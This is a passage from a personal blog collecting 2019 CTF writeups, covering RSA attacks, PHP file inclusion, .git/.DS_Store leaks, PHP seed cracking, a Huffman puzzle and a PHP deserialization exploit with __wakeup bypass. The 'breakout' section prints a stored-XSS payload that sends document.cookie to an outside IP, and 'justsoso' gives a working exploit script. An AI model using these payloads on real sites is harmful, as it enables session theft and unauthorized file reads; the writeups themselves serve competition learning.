class="string">"0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d"</span></span><br><span class="line">	c2=<span class="string">"0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6"</span></span><br><span class="line">	e1=int(e1,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">	e2=int(e2,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">	n=int(n,<span class="number">16</span>)</span><br><span class="line">	c1=int(c1,<span class="number">16</span>)</span><br><span class="line">	c2=int(c2,<span class="number">16</span>)</span><br><span class="line">	<span class="comment"># print gmpy2.gcd(e1,e2)</span></span><br><span class="line">	ans=same_attack(e1,e2,c1,c2,n)</span><br><span class="line">	<span class="comment"># print ans </span></span><br><span class="line">	small_attack(ans,n,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>加上“hgame”即可得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/03/03/kLDs9s.png" alt="kLDs9s.png"></p>
<h1 id="2019西湖论剑初赛复现"><a href="#2019西湖论剑初赛复现" class="headerlink" title="2019西湖论剑初赛复现"></a>2019西湖论剑初赛复现</h1><h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web"></a>Web</h2><h3 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h3><p>打开网页就发现了思路，<code>include $_GET(&#39;file&#39;)</code>，文件包含？？？<del>按理说安恒的题不应该这么明显看出来思路，肯定是出现了点问题…</del></p>
<p><img src="https://s2.ax1x.com/2019/04/11/AH8G1P.png" alt="AH8G1P.png"></p>
<p>尝试使用php封装的协议读取一下<code>index.php</code>；成功……<del>WTF????</del></p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHGHGn.png" alt="AHGHGn.png">base64一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$a) &#123;</span><br><span class="line">	$a = <span class="string">'./templates/index.html'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure>
<p>发现确实是文件包含没错了，要求GET的变量不能包含flag字符，hint解密为dir.php；那就直接读取dir.php；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>
<p>GET一个dir参数，打印出目录列表，那就直接读根目录即可；发现flag信息：</p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHtjqf.png" alt="AHtjqf.png"></p>
<p>再返回首页继续用封装协议读文件即可：</p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHUQAS.png" alt="AHUQAS.png"></p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHUBh4.png" alt="AHUBh4.png"></p>
<p>不过试了一下直接<code>?file=/ffffflag_1s_Her4</code>也是可行的，应该是判断写的有问题…非预期解…</p>
<h3 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a>猜猜flag是什么</h3><p>没什么思路，直接扫后台，扫出.DS_store，应该对应的是MacOS的.DS_Store 文件泄漏</p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHBkQJ.png" alt="AHBkQJ.png"></p>
<p>用exp脚本工具将目录下的东西下载下来</p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHDZcQ.png" alt="AHDZcQ.png"></p>
<p>打开并没有发现什么有用的东西，都是一些套路…扫描<code>http://61.164.47.198:10002/e10adc3949ba59abbe56e057f20f883e</code></p>
<p>时发现.git泄露：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/AbnCL9.png" alt="AbnCL9.png"></p>
<p>使用githack恢复源码：</p>
<p><img src="https://s2.ax1x.com/2019/04/11/AHrdMQ.png" alt="AHrdMQ.png"></p>
<p>发现压缩包是经过加密的，发现不仅给了压缩包，还给了一张图片，联想到zip明文攻击，攻击后得到hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code is 9faedd5999937171912159d28b219d86</span><br><span class="line">well ok ur good...By the way, flag saved in flag/seed.txt</span><br></pre></td></tr></table></figure>
<p>访问<code>http://61.164.47.198:10002/?code=9faedd5999937171912159d28b219d86</code>得到伪随机数<strong>500853255</strong></p>
<p>使用c语言脚本工具php_mt_seed在kali下爆破得到3个seed：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/Abn1ot.png" alt="Abn1ot.png"></p>
<p>第一个就是正确的seed：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/AbnNQg.png" alt="AbnNQg.png"></p>
<p>参考链接:<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
<h3 id="breakout"><a href="#breakout" class="headerlink" title="breakout"></a>breakout</h3><p>随手输入登录进去，发现第一个页面是一个留言功能，容易联想到XSS：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/AqeXQg.png" alt="AqeXQg.png"></p>
<p>第二个页面，发现bug后，将页面的URL提交给管理员，管理员会携带cookie查看：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/AqmAlF.png" alt="AqmAlF.png"></p>
<p>第三个页面：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/Aqmem9.png" alt="Aqmem9.png"></p>
<p>看到第三个界面联想到命令执行，测试一下发现需要管理员身份，</p>
<p><img src="https://s2.ax1x.com/2019/04/12/AqmNTI.png" alt="AqmNTI.png"></p>
<p>这样的话，思路就出来了，大概就是用存储型xss，将存在xss的url发送给管理员形成xss盗取cookie，随后伪造管理员身份进行登录，命令执行；</p>
<h4 id="构造XSS"><a href="#构造XSS" class="headerlink" title="构造XSS"></a>构造XSS</h4><p>测试一下找到输出点：</p>
<p><img src="https://s2.ax1x.com/2019/04/12/Aqn2Ke.png" alt="Aqn2Ke.png"></p>
<p>fuzz一下，发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(233);&lt;/script&gt;</span><br><span class="line">&lt;:)&gt;alert(233);</span><br></pre></td></tr></table></figure>
<p>基本的字符script都被替换掉了，测试一下<code>&lt;li&gt;2333&lt;/li&gt;</code>发现还是可用的</p>
<p><img src="https://s2.ax1x.com/2019/04/12/Aqulse.png" alt="Aqulse.png"></p>
<p>所以我们可以采取闭合<code>&lt;li&gt;</code>标签的方法来构造XSS，尝试unicode编码绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/li&gt;&lt;iframe src=&quot;java&amp;#115;cript:window.location.href=&apos;http://165.227.63.123:2335/?a=&apos;+document.cookie&quot;&gt;&lt;/iframe&gt;&lt;li&gt;</span><br></pre></td></tr></table></figure>
<p>不过一直没有打到cookie，在此记录一下思路……</p>
<h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="哈夫曼之谜"><a href="#哈夫曼之谜" class="headerlink" title="哈夫曼之谜"></a>哈夫曼之谜</h3><p>手动解题：</p>
<p>d和5的编码不确定，有两种可能性，<del>手动复习哈夫曼树</del></p>
<p><img src="https://s2.ax1x.com/2019/04/12/AbvRxK.jpg" alt="AbvRxK.jpg"></p>
<h1 id="2019信息安全国赛部分WP"><a href="#2019信息安全国赛部分WP" class="headerlink" title="2019信息安全国赛部分WP"></a>2019信息安全国赛部分WP</h1><h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web"></a>Web</h2><h3 id="justsoso"><a href="#justsoso" class="headerlink" title="justsoso"></a>justsoso</h3><p>这题一开始查看源代码：</p>
<p><img src="https://s2.ax1x.com/2019/04/20/EPmJjH.png" alt="EPmJjH.png"></p>
<p>提示读文件，想到文件包含，直接用php://协议读文件</p>
<p>得到index.php和hint.php</p>
<p><strong>index.php:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>hint.php:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显是反序列化漏洞，先看index.php，对$file参数的限制注定读取不了flag.php，所以我们包含hint.php来构造反序列化，完成读文件的操作；</p>
<h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>但是要反序列化必须要先绕过正则判断<code>preg_match(&quot;/flag/&quot;,$value)</code>，一开始天真地以为正则可以直接绕过，所以浪费了很多时间，仔细审计代码，发现是利用parse_url函数进行绕过的一个漏洞：</p>
<p><strong>本地测试：</strong></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">var_dump($url);</span><br><span class="line">parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line"><span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>1.不做任何绕过：</p>
<p><img src="https://s2.ax1x.com/2019/04/20/EPMLQO.png" alt="EPMLQO.png"></p>
<p>2.在ip后面的路径加上个<code>//</code>，parse_url()会把<code>//</code>认为是相对路径；</p>
<p><img src="https://s2.ax1x.com/2019/04/20/EPM7Jx.png" alt="EPM7Jx.png"></p>
<p>3.在ip后面加上<code>///</code>，parse_url会返回false</p>
<blockquote>
<p>Note: parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/04/20/EPQpFI.png" alt="EPQpFI.png"></p>
<p>这里加上<code>//</code>起不到任何作用，因为query参数没有任何变化，需要构造<code>///</code>，<code>preg_match(&quot;/flag/&quot;,$value)</code></p>
<p>里的$value即为空值，肯定是可以绕过正则匹配的；</p>
<h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>到此为止已经可以成功反序列化了，所以需要构造序列化字符串；<del>联想到pop链的构造，但貌似不是，噗哈哈</del></p>
<p><strong>分析：</strong></p>
<p>1.有两个不同的类，需要调用的关键方法是Flag类中的getFlag()方法，但是在进行反序列化的时候是不会自动调用的；</p>
<p>2.Handle类中的__destruct()方法是魔术方法，可以调用Flag类中的getFlag()方法，此时联想到将$handle赋值为Flag类的对象，此时就可以直接从Handle类里直接调用Flag类中的方法；</p>
<p>3.<code>__wakeup()</code>将在反序列化之后立即被调用，这个<code>__wakeup()</code>函数的作用就是将对象中的参数全部赋空，所以因此需要绕过__wakeup()；</p>
<p><strong>测试：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gardenia1;</span><br><span class="line">	<span class="keyword">public</span> $gardenia2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$sky=<span class="keyword">new</span> a();</span><br><span class="line">$sky-&gt;gardenia1=<span class="string">'haha'</span>;</span><br><span class="line">$sky-&gt;gardenia2=<span class="string">'kk'</span>;</span><br><span class="line">var_dump($sky);</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars($sky) <span class="keyword">as</span> $k =&gt; $v) </span><br><span class="line">&#123;</span><br><span class="line">    $sky-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($sky);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>测试结果：</strong></p>
<p><img src="https://s2.ax1x.com/2019/04/20/EP1zTJ.png" alt="EP1zTJ.png"></p>
<p><strong>bypass技巧：</strong></p>
<blockquote>
<p>当序列化字符串当中属性个数值大于实际的属性个数时,就会导致反序列化异常,从而跳过__wakeup函数；</p>
</blockquote>
<p>那此时只需要改变反序列化的属性个数即可；</p>
<h4 id="bypass3"><a href="#bypass3" class="headerlink" title="bypass3"></a>bypass3</h4><p>绕过了上述两个点以后，看getFlag()函数，此时需要<code>$this-&gt;token === $this-&gt;token_flag</code>但是这两个随机值的散列值是很难做到强相等的，所以这就想到一叶飘零学长在安恒1月赛的骚操作，直接用<strong>引用</strong>的方法，使得两个变量指向同一个地址即可(飘零大佬tql)</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$gardenia1=<span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$gardenia1-&gt;token=&amp;$gardenia1-&gt;token_flag;</span><br><span class="line">$gardenia2=<span class="keyword">new</span> Handle($gardenia1);</span><br><span class="line">$res=urlencode(serialize($gardenia2));</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改参数个数绕过__wakeup()即可得到flag；</p>
<p><img src="https://s2.ax1x.com/2019/04/20/EPml4K.png" alt="EPml4K.png"></p>
<p><strong>参考链接：</strong><a href="http://www.am0s.com/functions/406.html，http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html，http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gard3nia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gardenia30.top/2019/01/19/2019-Writeup总结/">https://gardenia30.top/2019/01/19/2019-Writeup总结/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/01/22/深入了解HTTP请求流程/"><i class="fa fa-chevron-left">  </i><span>深入了解HTTP请求流程</span></a></div><div class="next-post pull-right"><a href="/2019/01/15/密码学笔记/"><span>密码学学习笔记</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Gard3nia</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Just keep moving!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script 